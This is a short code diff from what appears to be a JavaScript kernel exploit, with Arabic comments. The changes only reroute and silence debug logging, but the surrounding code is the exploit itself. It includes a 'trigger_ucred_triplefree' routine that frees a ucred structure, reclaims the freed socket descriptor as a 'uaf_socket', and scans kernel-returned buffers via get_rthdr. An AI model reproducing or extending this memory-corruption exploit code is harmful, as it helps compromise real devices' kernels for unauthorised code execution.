@@ -771,16 +771,16 @@ function monitor_header(sock, buf, maxLen, tag) {
   write32(tag_len, maxLen);
   const ret = get_rthdr(sock, buf, tag_len);
 
-  log_monitor("ret", ret);
+  log("ret", ret);
 
   if (ret < 0) {
-    log_monitor("status", "FAIL");
+    log("status", "FAIL");
     return { ok: false };
   }
 
   // الطول الفعلي
   const actual_len = read32(tag_len);
-  log_monitor("len", actual_len);
+  log("len", actual_len);
 
   // اعمل scan
   const hits = scan_for_tag(buf, actual_len, tag);
@@ -803,16 +803,16 @@ function scan_for_tag(buf, maxLen, tag) {
   }
 
   if (hits.length === 0) {
-    log_monitor("tag_found", false);
+    log("tag_found", false);
   } else {
-    log_monitor("tag_found", true);
-    log_monitor("tag_hits", hits);
+    log("tag_found", true);
+    log("tag_hits", hits);
   }
 
   return hits;
 }
-function log_monitor(key, value) {
-  console.log("[MON]", key, "=", value);
+function log(key, value) {
+  send_notification ("[MON]", key, "=", value);
 }
 // خريطة تكرار الأوفستات
 var offset_map = {};
@@ -1390,7 +1390,7 @@ function trigger_ucred_triplefree() {
     write32(sock_buf, dummy_socket);
     //send_notification("[STEP 1] alloc sock_buf + write fd: sock_buf=" + sock_buf + " fd=" + dummy_socket);
 
-    send_notification("[STEP 1] netcontrol register: cmd=" + hex(0x20000003) + " buf=" + sock_buf);
+    //send_notification("[STEP 1] netcontrol register: cmd=" + hex(0x20000003) + " buf=" + sock_buf);
    // netcontrol(-1, 0x20000003, sock_buf, 8);
 
     //send_notification("[STEP 1] close dummy_socket: fd=" + dummy_socket);
@@ -1403,7 +1403,7 @@ function trigger_ucred_triplefree() {
 
     // 3) reclaim fd → uaf_socket
     uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    send_notification("[STEP 3] reclaim fd as uaf_socket: uaf_socket=" + uaf_socket);
+    //send_notification("[STEP 3] reclaim fd as uaf_socket: uaf_socket=" + uaf_socket);
 
 
     // 4) free previous ucred
